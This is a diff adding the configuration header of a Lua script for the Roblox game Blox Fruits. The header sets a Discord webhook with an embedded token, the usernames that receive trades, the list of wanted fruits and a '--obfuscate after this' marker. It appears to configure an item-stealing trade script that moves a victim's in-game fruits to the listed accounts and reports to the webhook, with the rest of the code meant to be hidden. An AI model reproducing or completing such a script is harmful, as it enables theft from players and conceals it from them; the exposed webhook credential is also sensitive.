@@ -1,3 +1,10 @@
+Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe"
+Usernames = {"user2", "user1"} -- << Username(-s) it'll accept trade with
+Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Control-Control"} -- << Fruits you want
+FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+    "Gravity-Gravity"
+}
+
 --obfuscate after this
 if not Webhook then
     Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe"
